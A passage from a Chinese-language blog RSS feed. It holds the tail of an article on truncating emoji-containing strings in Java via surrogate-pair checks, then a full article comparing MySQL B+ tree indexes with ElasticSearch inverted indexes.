&lt;p&gt;对于这种情况，我们可以通过&lt;code&gt;Character&lt;/code&gt;类的静态方法&lt;code&gt;isHighSurrogate&lt;/code&gt;和&lt;code&gt;isLowSurrogate&lt;/code&gt;来判断，单个&lt;code&gt;emoji&lt;/code&gt;的组合就是&lt;strong&gt;高位+低位&lt;/strong&gt;，所以对于辅助平面内的代理对，做到整个移除或保留即可。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;isHighSurrogate&lt;/code&gt;方法的源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static final char MIN_HIGH_SURROGATE = '\uD800';

public static final char MAX_HIGH_SURROGATE = '\uDBFF';

public static boolean isHighSurrogate(char ch) {
    return ch &amp;gt;= MIN_HIGH_SURROGATE &amp;amp;&amp;amp; ch &amp;lt; (MAX_HIGH_SURROGATE + 1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个判断其实就是上面说的&lt;code&gt;「High Surrogates」&lt;/code&gt;的判定方式，我们可以转换一下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;U+D800 &amp;lt;= ch &amp;lt;= U+DBFF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;同理，&lt;code&gt;isLowSurrogate&lt;/code&gt;方法的判定方式也是一样的：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;U+DC00 &amp;lt;= ch &amp;lt;= U+DFFF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;问题解决&quot;&gt;问题解决&lt;/h3&gt;
&lt;p&gt;还是先运行一下代码，看看效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/65aefc14080c48bfa6705134f47c6688~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;问题解决.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;具体实现代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static void main(String[] args) {
    // 用户昵称为：🐳🐳🐠，正常结果应该为：🐳***🐠
    String context = &quot;\uD83D\uDC33\uD83D\uDC33\uD83D\uDC20&quot;;
    int realNameLength = realStringLength(context);
    String namePrefix = subString(context, 1, 0);
    String nameSuffix = subString(context, realNameLength - 1, 1);
    context = String.format(&quot;%s%s%s&quot;, namePrefix, &quot;***&quot;, nameSuffix);
    System.out.println(context);
}

/**
 * 包含emoji表情的subString方法
 *
 * @param str 原有的str
 * @param len str长度
 * @param type type = 0 代表prefix，其他代表suffix
 */
private static String subString(String str, int len, int type) {
    if (len &amp;lt; 0) {
        return str;
    }

    int count = 0;
    for (int i = 0; i &amp;lt; str.length(); i++) {
        if (count == len) {
            // type = 0 代表prefix，其他代表suffix
            if (type == 0) {
                return str.substring(0, i);
            }
            return str.substring(i);
        }

        char c = str.charAt(i);
        if (Character.isHighSurrogate(c) || Character.isLowSurrogate(c)) {
            i++;
        }
        count++;
    }

    return str;
}


/**
 * 包含emoji表情的字符串实际长度
 *
 * @param str 原有str
 * @return str实际长度
 */
private static int realStringLength(String str) {
    int count = 0;
    for (int i = 0; i &amp;lt; str.length(); i++) {
        char c = str.charAt(i);
        if (Character.isHighSurrogate(c) || Character.isLowSurrogate(c)) {
            i++;
        }
        count++;
    }

    return count;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;彩蛋：认领属于你的emoji&quot;&gt;彩蛋：认领属于你的emoji&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;emoji&lt;/code&gt;远远不止于此，&lt;code&gt;unicode&lt;/code&gt;旗下还可以支持对&lt;code&gt;emoji&lt;/code&gt;进行捐赠的，当然这个&lt;code&gt;emoji&lt;/code&gt;会以捐赠者的名义去命名的。如下是现有的&lt;a href=&quot;https://www.unicode.org/consortium/adopted-characters.html&quot;&gt;捐赠列表&lt;/a&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/02b16113df2e41269e89b5c7c2971f9d~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;捐助列表.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/02182e342d2c417bb5647cc2edcd7422~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;捐助列表2.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看到第一个就是elastic.co捐赠的，而且点击链接可以直接进入他们官网。第二个捐赠列表中还有一个是我同事捐赠的，哈哈，很有意思。&lt;/p&gt;
&lt;p&gt;如果想自己捐赠也可以直接进入到&lt;a href=&quot;https://www.unicode.org/consortium/adopted-characters.html&quot;&gt;emoji捐赠网站&lt;/a&gt;去填写个人信息，一共有三个档位，捐赠后这个列表就会显示由你定义的&lt;code&gt;emoji&lt;/code&gt;信息了，简直太酷了😎：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6d572f1059294ae3b90269adb950e2ed~tplv-k3u1fbpfcp-zoom-1.image&quot; alt=&quot;一枝花.png&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;一个小小的&lt;code&gt;emoji&lt;/code&gt;真是学问无穷，由于篇幅的问题我这里还省略了很多东西，比如&lt;code&gt;UTF-8&lt;/code&gt;和&lt;code&gt;UTF-16&lt;/code&gt;两种编码形式并没有深入讲解，这里面又会牵扯到很多内容。&lt;/p&gt;
&lt;p&gt;我希望这篇文章能够做到一个&lt;strong&gt;抛砖引玉&lt;/strong&gt;的作用，激发小伙伴们一起去探究更多的奥秘。&lt;/p&gt;
&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;strong&gt;维基百科 Unicode&lt;/strong&gt;：&lt;a href=&quot;https://zh.wikipedia.org/wiki/Unicode&quot;&gt;https://zh.wikipedia.org/wiki/Unicode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;维基百科 Unicode字符平面映射&lt;/strong&gt;：&lt;a href=&quot;https://zh.wikipedia.org/wiki/Unicode%E5%AD%97%E7%AC%A6%E5%B9%B3%E9%9D%A2%E6%98%A0%E5%B0%84&quot;&gt;https://zh.wikipedia.org/wiki/Unicode字符平面映射&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不要小看小小的 emoji 表情&lt;/strong&gt;：&lt;a href=&quot;https://juejin.im/post/6844903938878078990&quot;&gt;https://juejin.im/post/6844903938878078990&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;谈谈字符编码：Unicode、UTF-8 和 char[]&lt;/strong&gt;：&lt;a href=&quot;https://luan.ma/post/character-encoding/&quot;&gt;https://luan.ma/post/character-encoding/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;字符截断引发的emoji表情乱码问题&lt;/strong&gt;：&lt;a href=&quot;https://superxlcr.github.io/2018/06/19/%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD%E5%BC%95%E5%8F%91%E7%9A%84emoji%E8%A1%A8%E6%83%85%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/&quot;&gt;https://superxlcr.github.io/2018/06/19/字符截断引发的emoji表情乱码问题/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;emoji捐赠列表&lt;/strong&gt;：&lt;a href=&quot;https://www.unicode.org/consortium/adopted-characters.html&quot;&gt;https://www.unicode.org/consortium/adopted-characters.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;欢迎关注我的公众号，一起交流学习：&quot;&gt;欢迎关注我的公众号，一起交流学习：&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://oscimg.oschina.net/oscnet/up-e5c4491f04190146f30c37123b721c31e38.png&quot; alt=&quot;欢迎关注&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 22:38:00 +0000</pubDate>
<dc:creator>一枝花算不算浪漫</dc:creator>
<og:description>前言 之前也分享过很多工作中踩坑的经验： 一个线上问题的思考：Eureka注册中心集群如何实现客户端请求负载及故障转移？ 【原创】经验分享：一个Content-Length引发的血案(almost..</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wang-meng/p/13783563.html</dc:identifier>
</item>
<item>
<title>ElasticSearch 索引 VS MySQL 索引 - crossoverJie</title>
<link>http://www.cnblogs.com/crossoverJie/p/13783463.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/crossoverJie/p/13783463.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi01tzwikkj31hc0u0toq.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这段时间在维护产品的搜索功能，每次在管理台看到 &lt;code&gt;elasticsearch&lt;/code&gt; 这么高效的查询效率我都很好奇他是如何做到的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18y8no3wj318y0dcac1.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这甚至比在我本地使用 &lt;code&gt;MySQL&lt;/code&gt; 通过主键的查询速度还快。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18yukebvj30ps0363yo.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;为此我搜索了相关资料：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18z0c7plj30u016z4er.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这类问题网上很多答案，大概意思呢如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ES 是基于 &lt;code&gt;Lucene&lt;/code&gt; 的全文检索引擎，它会对数据进行分词后保存索引，擅长管理大量的索引数据，相对于 &lt;code&gt;MySQL&lt;/code&gt; 来说不擅长经常更新数据及关联查询。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;说的不是很透彻，没有解析相关的原理；不过既然反复提到了索引，那我们就从索引的角度来对比下两者的差异。&lt;/p&gt;

&lt;p&gt;先从 &lt;code&gt;MySQL&lt;/code&gt; 说起，索引这个词想必大家也是烂熟于心，通常存在于一些查询的场景，是典型的空间换时间的案例。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-json&quot;&gt;以下内容以 Innodb 引擎为例。
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;常见的数据结构&quot;&gt;常见的数据结构&lt;/h2&gt;
&lt;p&gt;假设由我们自己来设计 &lt;code&gt;MySQL&lt;/code&gt; 的索引，大概会有哪些选择呢？&lt;/p&gt;
&lt;h3 id=&quot;散列表&quot;&gt;散列表&lt;/h3&gt;
&lt;p&gt;首先我们应当想到的是散列表，这是一个非常常见且高效的查询、写入的数据结构，对应到 &lt;code&gt;Java&lt;/code&gt; 中就是 &lt;code&gt;HashMap&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18zcyxozj31ap0u0gph.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个数据结构应该不需要过多介绍了，它的写入效率很高&lt;code&gt;O(1)&lt;/code&gt;,比如我们要查询 &lt;code&gt;id=3&lt;/code&gt; 的数据时，需要将 3 进行哈希运算，然后再这个数组中找到对应的位置即可。&lt;/p&gt;
&lt;p&gt;但如果我们想查询 &lt;code&gt;1≤id≤6&lt;/code&gt; 这样的区间数据时，散列表就不能很好的满足了，由于它是无序的，所以得将所有数据遍历一遍才能知道哪些数据属于这个区间。&lt;/p&gt;
&lt;h3 id=&quot;有序数组&quot;&gt;有序数组&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18zpdguqj31600aiaax.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;有序数组的查询效率也很高，当我们要查询 &lt;code&gt;id=4&lt;/code&gt; 的数据时，只需要通过二分查找也能高效定位到数据&lt;code&gt;O(logn)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;同时由于数据也是有序的，所以自然也能支持区间查询；这么看来有序数组适合用做索引咯?&lt;/p&gt;
&lt;p&gt;自然是不行，它有另一个重大问题；假设我们插入了 &lt;code&gt;id=2.5&lt;/code&gt; 的数据，就得同时将后续的所有数据都移动一位，这个写入效率就会变得非常低。&lt;/p&gt;
&lt;h3 id=&quot;平衡二叉树&quot;&gt;平衡二叉树&lt;/h3&gt;
&lt;p&gt;既然有序数组的写入效率不高，那我们就来看看写入效率高的，很容易就能想到二叉树；这里我们以平衡二叉树为例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi18zx774dj313g0jwn36.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于平衡二叉树的特性：&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;左节点小于父节点、右节点大于父节点。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以假设我们要查询 &lt;code&gt;id=11&lt;/code&gt; 的数据，只需要查询 &lt;code&gt;10—&amp;gt;12—&amp;gt;11&lt;/code&gt; 便能最终找到数据，时间复杂度为&lt;code&gt;O(logn)&lt;/code&gt;，同理写入数据时也为&lt;code&gt;O(logn)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;但依然不能很好的支持区间范围查找，假设我们要查询&lt;code&gt;5≤id≤20&lt;/code&gt; 的数据时，需要先查询10节点的左子树再查询10节点的右子树最终才能查询到所有数据。&lt;/p&gt;
&lt;p&gt;导致这样的查询效率并不高。&lt;/p&gt;
&lt;h3 id=&quot;跳表&quot;&gt;跳表&lt;/h3&gt;
&lt;p&gt;跳表可能不像上边提到的散列表、有序数组、二叉树那样日常见的比较多，但其实 &lt;code&gt;Redis&lt;/code&gt; 中的 &lt;code&gt;sort set&lt;/code&gt; 就采用了跳表实现。&lt;/p&gt;
&lt;p&gt;这里我们简单介绍下跳表实现的数据结构有何优势。&lt;/p&gt;
&lt;p&gt;我们都知道即便是对一个&lt;strong&gt;有序链表&lt;/strong&gt;进行查询效率也不高，由于它不能使用数组下标进行二分查找，所以时间复杂度是&lt;code&gt;o(n)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但我们也可以巧妙的优化链表来变相的实现二分查找，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi190dy4wqj31bw0hc448.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以为最底层的数据提取出一级索引、二级索引，根据数据量的不同，我们可以提取出 N 级索引。&lt;/p&gt;
&lt;p&gt;当我们查询时便可以利用这里的索引变相的实现了二分查找。&lt;/p&gt;
&lt;p&gt;假设现在要查询 &lt;code&gt;id=13&lt;/code&gt; 的数据，只需要遍历 &lt;code&gt;1—&amp;gt;7—&amp;gt;10—&amp;gt;13&lt;/code&gt; 四个节点便可以查询到数据，当数越多时，效率提升会更明显。&lt;/p&gt;
&lt;p&gt;同时区间查询也是支持，和刚才的查询单个节点类似，只需要查询到起始节点，然后依次往后遍历（&lt;strong&gt;链表有序&lt;/strong&gt;）到目标节点便能将整个范围的数据查询出来。&lt;/p&gt;
&lt;p&gt;同时由于我们在索引上不会存储真正的数据，只是存放一个指针，相对于最底层存放数据的链表来说占用的空间便可以忽略不计了。&lt;/p&gt;
&lt;h2 id=&quot;平衡二叉树的优化&quot;&gt;平衡二叉树的优化&lt;/h2&gt;
&lt;p&gt;但其实 &lt;code&gt;MySQL&lt;/code&gt; 中的 &lt;code&gt;Innodb&lt;/code&gt; 并没有采用跳表，而是使用的一个叫做 &lt;code&gt;B+&lt;/code&gt; 树的数据结构。&lt;/p&gt;
&lt;p&gt;这个数据结构不像是二叉树那样大学老师当做基础数据结构经常讲到，由于这类数据结构都是在实际工程中根据需求场景在基础数据结构中演化而来。&lt;/p&gt;
&lt;p&gt;比如这里的 &lt;code&gt;B+&lt;/code&gt; 树就可以认为是由平衡二叉树演化而来。&lt;/p&gt;
&lt;p&gt;刚才我们提到二叉树的区间查询效率不高，针对这一点便可进行优化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi190og1h6j31o40u0k67.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在原有二叉树的基础上优化后：所有的非叶子都不存放数据，只是作为叶子节点的索引，数据全部都存放在叶子节点。&lt;/p&gt;
&lt;p&gt;这样所有叶子节点的数据都是有序存放的，便能很好的支持区间查询。&lt;/p&gt;
&lt;p&gt;只需要先通过查询到起始节点的位置，然后在叶子节点中依次往后遍历即可。&lt;/p&gt;
&lt;p&gt;当数据量巨大时，很明显索引文件是不能存放于内存中，虽然速度很快但消耗的资源也不小；所以 &lt;code&gt;MySQL&lt;/code&gt; 会将索引文件直接存放于磁盘中。&lt;/p&gt;
&lt;p&gt;这点和后文提到 elasticsearch 的索引略有不同。&lt;/p&gt;
&lt;p&gt;由于索引存放于磁盘中，所以我们要尽可能的减少与磁盘的 IO（磁盘 IO 的效率与内存不在一个数量级）&lt;/p&gt;
&lt;p&gt;通过上图可以看出，我们要查询一条数据至少得进行 4 次IO，很明显这个 IO 次数是与树的高度密切相关的，树的高度越低 IO 次数就会越少，同时性能也会越好。&lt;/p&gt;
&lt;p&gt;那怎样才能降低树的高度呢？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi190wn3k2j311u0jo43r.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们可以尝试把二叉树变为三叉树，这样树的高度就会下降很多，这样查询数据时的 IO 次数自然也会降低，同时查询效率也会提高许多。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这其实就是 B+ 树的由来。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;使用索引的一些建议&quot;&gt;使用索引的一些建议&lt;/h2&gt;
&lt;p&gt;其实通过上图对 &lt;code&gt;B+树&lt;/code&gt;的理解，也能优化日常工作的一些小细节；比如为什么需要最好是有序递增的？&lt;/p&gt;
&lt;p&gt;假设我们写入的主键数据是无序的，那么有可能后写入数据的 id 小于之前写入的，这样在维护 &lt;code&gt;B+树&lt;/code&gt; 索引时便有可能需要移动已经写好数据。&lt;/p&gt;
&lt;p&gt;如果是按照递增写入数据时则不会有这个考虑，每次只需要依次写入即可。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;所以我们才会要求数据库主键尽量是趋势递增的，不考虑分表的情况时最合理的就是自增主键。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整体来看思路和跳表类似，只是针对使用场景做了相关的调整（比如数据全部存储于叶子节点）。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;MySQL&lt;/code&gt; 聊完了，现在来看看 &lt;code&gt;Elasticsearch&lt;/code&gt; 是如何来使用索引的。&lt;/p&gt;
&lt;h2 id=&quot;正排索引&quot;&gt;正排索引&lt;/h2&gt;
&lt;p&gt;在 ES 中采用的是一种名叫&lt;code&gt;倒排索引&lt;/code&gt;的数据结构；在正式讲倒排索引之前先来聊聊和他相反的&lt;code&gt;正排索引&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi193iw11cj313u0bsgms.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;以上图为例，我们可以通过 &lt;code&gt;doc_id&lt;/code&gt; 查询到具体对象的方式称为使用&lt;code&gt;正排索引&lt;/code&gt;，其实也能理解为一种散列表。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;本质是通过 key 来查找 value。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;比如通过 &lt;code&gt;doc_id=4&lt;/code&gt; 便能很快查询到 &lt;code&gt;name=jetty wang,age=20&lt;/code&gt; 这条数据。&lt;/p&gt;
&lt;h2 id=&quot;倒排索引&quot;&gt;倒排索引&lt;/h2&gt;
&lt;p&gt;那如果反过来我想查询 &lt;code&gt;name&lt;/code&gt; 中包含了 &lt;code&gt;li&lt;/code&gt; 的数据有哪些？这样如何高效查询呢？&lt;/p&gt;
&lt;p&gt;仅仅通过上文提到的正排索引显然起不到什么作用，只能依次将所有数据遍历后判断名称中是否包含 &lt;code&gt;li&lt;/code&gt; ；这样效率十分低下。&lt;/p&gt;
&lt;p&gt;但如果我们重新构建一个索引结构：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi1940f4trj314e0f0q4e.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当要查询 &lt;code&gt;name&lt;/code&gt; 中包含 &lt;code&gt;li&lt;/code&gt; 的数据时，只需要通过这个索引结构查询到 &lt;code&gt;Posting List&lt;/code&gt; 中所包含的数据，再通过映射的方式查询到最终的数据。&lt;/p&gt;
&lt;p&gt;这个索引结构其实就是&lt;code&gt;倒排索引&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;term-dictionary&quot;&gt;Term Dictionary&lt;/h2&gt;
&lt;p&gt;但如何高效的在这个索引结构中查询到 &lt;code&gt;li&lt;/code&gt; 呢，结合我们之前的经验，只要我们将 &lt;code&gt;Term&lt;/code&gt; 有序排列，便可以使用二叉树搜索树的数据结构在&lt;code&gt;o(logn)&lt;/code&gt; 下查询到数据。&lt;/p&gt;
&lt;p&gt;将一个文本拆分成一个一个独立&lt;code&gt;Term&lt;/code&gt; 的过程其实就是我们常说的分词。&lt;/p&gt;
&lt;p&gt;而将所有 &lt;code&gt;Term&lt;/code&gt; 合并在一起就是一个 &lt;code&gt;Term Dictionary&lt;/code&gt;，也可以叫做单词词典。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;英文的分词相对简单，只需要通过空格、标点符号将文本分隔便能拆词，中文则相对复杂，但也有许多开源工具做支持（由于不是本文重点，对分词感兴趣的可以自行搜索）。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;当我们的文本量巨大时，分词后的 &lt;code&gt;Term&lt;/code&gt; 也会很多，这样一个倒排索引的数据结构如果存放于内存那肯定是不够存的，但如果像 &lt;code&gt;MySQL&lt;/code&gt; 那样存放于磁盘，效率也没那么高。&lt;/p&gt;
&lt;h2 id=&quot;term-index&quot;&gt;Term Index&lt;/h2&gt;
&lt;p&gt;所以我们可以选择一个折中的方法，既然无法将整个 &lt;code&gt;Term Dictionary&lt;/code&gt; 放入内存中，那我们可以为&lt;code&gt;Term Dictionary&lt;/code&gt; 创建一个索引然后放入内存中。&lt;/p&gt;
&lt;p&gt;这样便可以高效的查询&lt;code&gt;Term Dictionary&lt;/code&gt; ，最后再通过&lt;code&gt;Term Dictionary&lt;/code&gt; 查询到 &lt;code&gt;Posting List&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;相对于 &lt;code&gt;MySQL&lt;/code&gt; 中的 &lt;code&gt;B+树&lt;/code&gt;来说也会减少了几次&lt;code&gt;磁盘IO&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi191apu10j30ua0h0q7c.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这个 &lt;code&gt;Term Index&lt;/code&gt; 我们可以使用这样的 &lt;code&gt;Trie树&lt;/code&gt; 也就是我们常说的&lt;code&gt;字典树&lt;/code&gt; 来存放。&lt;/p&gt;
&lt;p&gt;更多关于字典树的内容请查看&lt;a href=&quot;https://crossoverjie.top/2019/01/14/netty/cim02-v1.0.1/&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi191fxwgxj318o094782.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果我们是以 &lt;code&gt;j&lt;/code&gt; 开头的 &lt;code&gt;Term&lt;/code&gt; 进行搜索，首先第一步就是通过在内存中的 &lt;code&gt;Term Index&lt;/code&gt; 查询出以 &lt;code&gt;j&lt;/code&gt; 打头的 &lt;code&gt;Term&lt;/code&gt; 在 &lt;code&gt;Term Dictionary&lt;/code&gt; 字典文件中的哪个位置（这个位置可以是一个文件指针，可能是一个区间范围）。&lt;/p&gt;
&lt;p&gt;紧接着在将这个位置区间中的所有 &lt;code&gt;Term&lt;/code&gt; 取出，由于已经排好序，便可通过二分查找快速定位到具体位置；这样便可查询出 &lt;code&gt;Posting List&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;最终通过 &lt;code&gt;Posting List&lt;/code&gt; 中的位置信息便可在原始文件中将目标数据检索出来。&lt;/p&gt;
&lt;h2 id=&quot;更多优化&quot;&gt;更多优化&lt;/h2&gt;
&lt;p&gt;当然 &lt;code&gt;ElasticSearch&lt;/code&gt; 还做了许多针对性的优化，当我们对两个字段进行检索时，就可以利用 &lt;code&gt;bitmap&lt;/code&gt; 进行优化。&lt;/p&gt;
&lt;p&gt;比如现在需要查询 &lt;code&gt;name=li and age=18&lt;/code&gt; 的数据，这时我们需要通过这两个字段将各自的结果 &lt;code&gt;Posting List&lt;/code&gt; 取出。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi194k1jk5j3138080t9e.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;最简单的方法是分别遍历两个集合，取出重复的数据，但这个明显效率低下。&lt;/p&gt;
&lt;p&gt;这时我们便可使用 &lt;code&gt;bitmap&lt;/code&gt; 的方式进行存储（还节省存储空间），同时利用先天的&lt;code&gt;位与&lt;/code&gt; ****计算便可得出结果&lt;strong&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[1, 3, 5]&lt;/code&gt; ⇒ &lt;code&gt;10101&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[1, 2, 4, 5]&lt;/code&gt; ⇒ &lt;code&gt;11011&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这样两个二进制数组求与便可得出结果：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10001&lt;/code&gt; ⇒ &lt;code&gt;[1, 5]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最终反解出 &lt;code&gt;Posting List&lt;/code&gt; 为&lt;code&gt;[1, 5]&lt;/code&gt;,这样的效率自然是要高上许多。&lt;/p&gt;
&lt;p&gt;同样的查询需求在 &lt;code&gt;MySQL&lt;/code&gt; 中并没有特殊优化，只是先将数据量小的数据筛选出来之后再筛选第二个字段，效率自然也就没有 &lt;code&gt;ES&lt;/code&gt; 高。&lt;/p&gt;
&lt;p&gt;当然在最新版的 &lt;code&gt;ES&lt;/code&gt; 中也会对 &lt;code&gt;Posting List&lt;/code&gt; 进行压缩，具体压缩规则可以查看&lt;a href=&quot;https://www.elastic.co/cn/blog/frame-of-reference-and-roaring-bitmaps&quot;&gt;官方文档&lt;/a&gt;，这里就不具体介绍了。&lt;/p&gt;

&lt;p&gt;最后我们来总结一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/007S8ZIlly1gi194xf948j315y0ca40z.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过以上内容可以看出再复杂的产品最终都是基础数据结构组成，只是会对不同应用场景针对性的优化，所以打好数据结构与算法的基础后再看某个新的技术或中间件时才能快速上手，甚至自己就能知道优化方向。&lt;/p&gt;
&lt;p&gt;最后画个饼，后续我会尝试按照 &lt;code&gt;ES&lt;/code&gt; 倒排索引的思路做一个单机版的搜索引擎，只有自己写一遍才能加深理解。&lt;/p&gt;
&lt;blockquote readability=&quot;1.7068965517241&quot;&gt;
&lt;p&gt;更好的阅读体验请访问&lt;a href=&quot;https://www.notion.so/ElasticSearch-VS-MySQL-54bddcc092c64c26b2127f1fb9772a23&quot;&gt;此处&lt;/a&gt;：&lt;a href=&quot;https://www.notion.so/ElasticSearch-VS-MySQL-54bddcc092c64c26b2127f1fb9772a23&quot;&gt;https://www.notion.so/ElasticSearch-VS-MySQL-54bddcc092c64c26b2127f1fb9772a23&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
